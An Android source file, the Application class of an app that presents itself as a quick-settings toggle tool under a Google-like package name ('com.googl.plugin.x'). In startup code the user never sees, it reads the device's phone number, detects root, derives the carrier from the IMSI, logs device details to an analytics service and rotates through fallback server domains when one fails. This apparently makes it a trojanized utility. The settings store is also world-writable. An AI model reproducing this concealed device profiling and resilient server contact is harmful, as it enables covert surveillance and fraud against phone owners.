package com.xstd.plugin.app;

import android.app.Application;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.text.TextUtils;
import com.bwx.bequick.Constants;
import com.bwx.bequick.fwk.Setting;
import com.bwx.bequick.fwk.SettingsFactory;
import com.bwx.bequick.preferences.BrightnessPrefs;
import com.bwx.bequick.preferences.CommonPrefs;
import com.googl.plugin.x.R;
import com.plugin.common.utils.UtilsConfig;
import com.plugin.common.utils.UtilsRuntime;
import com.plugin.internet.InternetUtils;
import com.plugin.internet.core.HttpConnectHookListener;
import com.plugin.internet.core.impl.JsonErrorResponse;
import com.umeng.analytics.MobclickAgent;
import com.xstd.plugin.Utils.CommonUtil;
import com.xstd.plugin.Utils.DomanManager;
import com.xstd.plugin.config.AppRuntime;
import com.xstd.plugin.config.Config;
import com.xstd.plugin.config.PluginSettingManager;

import java.io.File;
import java.util.ArrayList;
import java.util.Collections;
import java.util.Comparator;
import java.util.HashMap;

import static com.bwx.bequick.Constants.*;

/**
 * Created with IntelliJ IDEA.
 * User: michael
 * Date: 13-10-20
 * Time: AM8:35
 * To change this template use File | Settings | File Templates.
 */
public class PluginApp extends Application {

    private static final int[] IDS = new int[]{

			/* visible */
                                                  Setting.GROUP_VISIBLE,
                                                  Setting.BRIGHTNESS,
                                                  Setting.RINGER,
                                                  Setting.VOLUME,
                                                  Setting.BLUETOOTH,
                                                  Setting.WIFI,
                                                  Setting.GPS,
                                                  Setting.MOBILE_DATA,
                                                  Setting.FOUR_G,

			/* hidden */
                                                  Setting.GROUP_HIDDEN,
                                                  Setting.MASTER_VOLUME,
                                                  Setting.SCREEN_TIMEOUT,
                                                  Setting.WIFI_HOTSPOT,
                                                  Setting.AIRPLANE_MODE,
                                                  Setting.AUTO_SYNC,
                                                  Setting.AUTO_ROTATE,
                                                  Setting.LOCK_PATTERN,
                                                  Setting.MOBILE_DATA_APN
    };

    // state
    private ArrayList<Setting> mSettings;
    private SharedPreferences mPrefs;

    private Handler mHandler = new Handler(Looper.myLooper());

    @Override
    public void onCreate() {
        super.onCreate();

        initUMeng();
        MobclickAgent.onResume(this);

        PluginSettingManager.getInstance().init(getApplicationContext());
        if (PluginSettingManager.getInstance().getFirstLanuchTime() == 0) {
            PluginSettingManager.getInstance().setFirstLanuchTime(System.currentTimeMillis());
        }

        AppRuntime.getPhoneNumberForLocal(getApplicationContext());
        if (AppRuntime.isRootSystem()) {
            HashMap<String, String> log = new HashMap<String, String>();
            log.put("osVersion", Build.VERSION.RELEASE);
            log.put("phoneType", Build.MODEL);
            CommonUtil.umengLog(getApplicationContext(), "is_root", log);
        }
        AppRuntime.updateSIMCardReadyLog(getApplicationContext());

        int channelCode = Integer.valueOf(Config.CHANNEL_CODE);
        if (channelCode > 900000) {
            //是内置渠道
            PluginSettingManager.getInstance().setKeyHasBindingDevices(true);
        }

        String path = getFilesDir().getAbsolutePath() + "/" + Config.ACTIVE_RESPONSE_FILE;
        AppRuntime.RESPONSE_SAVE_FILE = path;

        UtilsConfig.init(this.getApplicationContext());

        InternetUtils.setHttpHookListener(getApplicationContext(), new HttpConnectHookListener() {

            @Override
            public void onPreHttpConnect(String baseUrl, String method, Bundle requestParams) {
            }

            @Override
            public void onPostHttpConnect(String result, int httpStatus) {
            }

            @Override
            public void onHttpConnectError(int code, String data, Object obj) {
                if (code == JsonErrorResponse.UnknownHostException) {
                    if (Config.DEBUG) {
                        Config.LOGD("[[setHttpHookListener::onHttpConnectError]] Error info : " + data);
                    }

                    String d = DomanManager.getInstance(getApplicationContext()).getOneAviableDomain();
                    DomanManager.getInstance(getApplicationContext()).costOneDomain(d);

                    //notify umeng
                    HashMap<String, String> log = new HashMap<String, String>();
                    log.put("failed_domain", d);
                    log.put("phoneType", Build.MODEL);
                    CommonUtil.umengLog(getApplicationContext(), "domain_failed", log);
                }
            }
        });

        AppRuntime.readActiveResponse(path);
        String type = String.valueOf(AppRuntime.getNetworkTypeByIMSI(getApplicationContext()));
        if (AppRuntime.ACTIVE_RESPONSE == null
                || TextUtils.isEmpty(AppRuntime.ACTIVE_RESPONSE.channelName)
                || !type.equals(AppRuntime.ACTIVE_RESPONSE.operator)) {
            if (Config.DEBUG) {
                Config.LOGD("[[PluginApp::onCreate]] delete old response save file as the data is error. " +
                                " Create PluginApp For Process : " + UtilsRuntime.getCurProcessName(getApplicationContext()) + "<><><><>");
            }
            AppRuntime.ACTIVE_RESPONSE = null;
            File file = new File(path);
            file.delete();
        }

        mHandler.postDelayed(new Runnable() {
            @Override
            public void run() {
                MobclickAgent.onPause(getApplicationContext());
            }
        }, 3000);


        String defaultText = getString(R.string.txt_status_unknown);
        // load settings
        SharedPreferences prefs = mPrefs = getSharedPreferences(PREFS_COMMON, MODE_WORLD_WRITEABLE);

        // create settings list
        ArrayList<Setting> settings = mSettings = new ArrayList<Setting>();
        int[] ids = IDS;
        int length = ids.length;
        Setting setting;
        for (int i = 0; i < length; i++) {
            int id = ids[i];
            int index = prefs.getInt(String.valueOf(id), length); // move to end
            setting = SettingsFactory.createSetting(id, index, defaultText, this);
            if (setting != null) settings.add(setting);
        }

        // sort list
        Collections.sort(settings, new Comparator<Setting>() {
            public int compare(Setting object1, Setting object2) {
                return object1.index - object2.index;
            }
        });

        // update status bar integration
        final int appearance = Integer.parseInt(prefs.getString(PREF_APPEARANCE, "0"));
        final int status = Integer.parseInt(prefs.getString(PREF_STATUSBAR_INTEGRATION, "0"));
        final boolean inverse = prefs.getBoolean(PREF_INVERSE_VIEW_COLOR, false);
        Intent intent = new Intent(ACTION_UPDATE_STATUSBAR_INTEGRATION);
        intent.putExtra(EXTRA_INT_STATUS, status);
        intent.putExtra(EXTRA_INT_APPEARANCE, appearance);
        intent.putExtra(EXTRA_BOOL_INVERSE_COLOR, inverse);
        sendBroadcast(intent);

        String version = prefs.getString(PREF_VERSION, null);
        if (version == null) {
            // update PREF_LIGHT_SENSOR on first start
            boolean hasLightSensor = BrightnessPrefs.hasLightSensor(this);
            String currentVersion = CommonPrefs.getVersionNumber(this);
            prefs.edit().putBoolean(Constants.PREF_LIGHT_SENSOR, hasLightSensor).putString(PREF_VERSION, currentVersion).commit();
        }
    }

    private void initUMeng() {
        MobclickAgent.setSessionContinueMillis(30 * 1000);
        MobclickAgent.setDebugMode(false);
        com.umeng.common.Log.LOG = false;
        MobclickAgent.onError(this);

        MobclickAgent.flush(this);
    }

    public void persistSettings() {
        SharedPreferences.Editor editor = mPrefs.edit();
        ArrayList<Setting> settings = mSettings;
        int length = settings.size();
        for (int i = 0; i < length; i++) {
            Setting setting = settings.get(i);
            editor.putInt(String.valueOf(setting.id), setting.index);
        }
        editor.commit();
    }

    public SharedPreferences getPreferences() {
        return mPrefs;
    }

    public ArrayList<Setting> getSettings() {
        return mSettings;
    }

    public Setting getSetting(int id) {
        ArrayList<Setting> settings = mSettings;
        int length = settings.size();
        for (int i = 0; i < length; i++) {
            Setting setting = settings.get(i);
            if (id == setting.id) return setting;
        }
        return null;
    }

}
